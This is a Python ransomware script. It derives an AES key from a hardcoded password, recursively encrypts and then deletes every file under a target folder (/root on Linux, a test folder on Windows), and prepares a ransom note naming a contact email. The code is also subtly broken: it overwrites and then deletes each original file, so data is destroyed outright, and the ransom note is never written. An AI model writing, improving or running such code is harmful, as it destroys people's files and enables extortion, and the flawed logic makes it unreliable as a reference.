import  os
import hashlib

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import platform

# predefined passoword
PASSWORD = "my_secure_password"

def derive_key(password: str, salt: bytes)-> bytes:
    """Derive a key from the password using Scrypt KDF."""
    kdf = Scrypt(
        salt=salt,
        length=32,
        n=2**14,
        r=8,
        p=1,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    return key

def encrypt_data(data: bytes, password: str) -> bytes:
    """Encrypt the data using AES-256-CBC."""
    # Generate a random salt
    salt = os.urandom(16)
    
    # Derive a key from the password and salt
    key = derive_key(password, salt)
    
    # Generate a random initialization vector (IV)
    iv = os.urandom(16)
    
    # Create a Cipher object
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Pad the data to be a multiple of the block size
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    
    # Encrypt the data
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    
    # Return the salt, IV, and ciphertext concatenated together
    return salt + iv + ciphertext

def encrypt_file(file_path: str, password: str):
    """Encrypt and delete the file at the given path."""
    with open(file_path, 'rb') as f:
        file_data = f.read()
    
    encrypted_data = encrypt_data(file_data, password)
    new_file_path = file_path + ".enc"
    # Write the encrypted data back to the file
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)
    os.remove(file_path)
    print(f"Encrypted and deleted: {file_path} -> {new_file_path}")

def encrypt_directory(directory: str, password: str):
    """Recursively encrypt all files in the given directory."""
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, password)
        create_ransom_note_webpage(directory)


    # Generate a random encryption code (for demonstration purposes)
def generate_token(length=24):
    import secrets, string
    alphabet = string.ascii_uppercase + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))


def create_ransom_note_webpage(directory: str):
    randomly_generated_code = generate_token()
    """Create a ransom note webpage in the given directory."""
    ransom_note_content = """
    <html>
    <head><title>Ransom Note</title></head>
    <body>
        <h1> All of your files have been encrypted.!</h1>
        <p>To unlock them, contact me with your encryption code at sheilafana21@gmail.com.</p>
        <p>Your encryption code is: {randomly_generated_code}</p>
    </body>
    </html>
    """

def main():
    # ascii_art = """
    # _____                                                                              
    #|  __ \                                                                             
    #| |__) |   __ _   _ __    ___    ___    _ __ ___   __      __   __ _   _ __    ___  
    #|  _  /   / _` | | '_ \  / __|  / _ \  | '_ ` _ \  \ \ /\ / /  / _` | | '__|  / _ \ 
    #| | \ \  | (_| | | | | | \__ \ | (_) | | | | | | |  \ V  V /  | (_| | | |    |  __/ 
    #|_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
    #"""
    # print(ascii_art)
    # detect os
    os_type = platform.system()
    if os_type == "Windows":
        target = r"C:\\Users\\%USERNAME%\\Desktop\\Ransomware_Test"
    elif os_type == "Linux":
        target = "/root"
    else: 
        print("Unsupported OS")
        return
    
    # Encrypt the target directory
    if os.path.isdir(target):
        encrypt_directory(target, PASSWORD)
        create_ransom_note_webpage(target)
        print(f"Encryption complete. Ransom note created in: {target}")
    else:
        print(f"Target directory does not exist: {target}")

if __name__ == "__main__":
    main()                                           
